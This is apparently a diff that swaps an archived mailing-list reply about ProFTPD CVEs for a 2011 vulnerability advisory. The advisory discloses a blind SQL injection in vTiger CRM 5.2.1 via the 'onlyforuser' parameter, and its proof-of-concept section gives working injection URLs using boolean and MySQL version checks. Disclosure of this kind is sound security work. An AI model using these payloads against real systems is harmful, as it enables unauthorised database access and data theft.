@@ -1,34 +1,100 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/14/7
-Message-ID: <alpine.DEB.2.00.1101141348250.3549@familiar.castaglia.org>
-Date: Fri, 14 Jan 2011 13:50:02 -0800 (PST)
-From: "TJ Saunders" <tj@...taglia.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/05/2
+Message-ID: <CAPYM6VyJba-ScKkmxGDD1K_n+gLfYkkrcv_gY2fUoYR6hP4SWw@mail.gmail.com>
+Date: Wed, 5 Oct 2011 18:07:12 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-cc: coley <coley@...re.org>
-Subject: Re: CVE request: proftpd before 1.3.3d
+Subject: CVE Request: vTiger CRM 5.2.x <= Blind SQL Injection Vulnerability
 Content-Type: text/plain; charset=utf-8
 
+vTiger CRM 5.2.x <= Blind SQL Injection Vulnerability
 
-> I could have swore this flaw got an ID, but I can't find it.
 
-  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
 
-Was the one assigned for the Telnet IAC issue:
+1. OVERVIEW
 
-  http://bugs.proftpd.org/show_bug.cgi?id=3521
+The vTiger CRM 5.2.1 and lower versions are vulnerable to Blind SQL
+Injection. No fixed version has been released as of 2011-10-05.
 
-The issue from the Phrack article did not have a CVE assigned, to my 
-knowledge; it was related to code in ProFTPD's mod_sql module:
 
-  http://bugs.proftpd.org/show_bug.cgi?id=3536
+2. BACKGROUND
 
-Cheers,
-TJ
+vtiger CRM is a free, full-featured, 100% Open Source CRM software
+ideal for small and medium businesses, with low-cost product support
+available to production users that need reliable support. vtiger CRM
+is a widely used product with thousands of users in dozens of
+countries.  It has a vibrant community of users driving the product
+forward, and contributing to it's development.  Over 2 million copies
+of vtiger CRM have been downloaded so far. It was launched as a fork
+of version 1.0 of the SugarCRM project launched on December 31st,
+2004.
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-   He who has never hoped can never despair.
+3. VULNERABILITY DESCRIPTION
 
-   	-George Bernard Shaw
+The "onlyforuser" parameter was not properly sanitized, which allows
+attacker to conduct Blind SQL Injection Attack. This could an attacker
+to inject or manipulate SQL queries in the back-end database, allowing
+for the manipulation or disclosure of arbitrary data.
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+4. VERSIONS AFFECTED
+
+Tested on 5.2.1
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+A future calendar event must be created in advance to trigger this
+vulnerability.
+
+Verified with Simple 1=1 Boolean check
+-----------------------------------------------------
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+1%3d1--
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+1%3d2--
+
+
+Verified with MySQL @@version  check
+-----------------------------------------------------
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+@@version%3d5--
+
+/index.php?action=index&module=Calendar&view=week&hour=0&day=5&month=12&year=2011&viewOption=listview&subtab=event&parenttab=My&onlyforuser=1+or+@@version%3d4--
+
+
+6. SOLUTION
+
+No patched version is available yet.
+The vendor hasn't attempted to fix the issues though they acknowledged
+the report.
+
+
+7. VENDOR
+
+vTiger Development Team
+http://www.vtiger.com/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2010-12-08: notified vendor
+2011-10-05: no fixed version released yet
+2011-10-05: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5BvTiger_5.2.1%5D_blind_sqlin
+Wiki VtigerCRM: https://secure.wikimedia.org/wikipedia/en/wiki/Vtiger_CRM
+
+
+#yehg [2011-10-05]
